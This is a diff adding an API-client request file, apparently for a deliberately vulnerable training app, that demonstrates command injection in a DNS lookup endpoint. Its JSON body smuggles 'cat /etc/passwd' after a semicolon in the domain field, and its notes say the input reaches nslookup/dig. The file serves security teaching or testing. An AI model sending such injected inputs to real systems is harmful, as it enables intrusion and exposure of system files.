@@ -1,0 +1,31 @@
+meta {
+  name: V07 CMDi - DNS Lookup
+  type: http
+  seq: 2
+}
+
+post {
+  url: {{baseUrl}}/api/tools/dns
+  body: json
+  auth: bearer
+}
+
+auth:bearer {
+  token: {{token}}
+}
+
+body:json {
+  {
+    "domain": "example.com; cat /etc/passwd"
+  }
+}
+
+docs {
+  # V07: Command Injection - DNS
+
+  ## Vulnerability
+  Domain parameter passed to nslookup/dig command.
+
+  ## Exploit
+  Same as ping - inject commands after semicolon.
+}
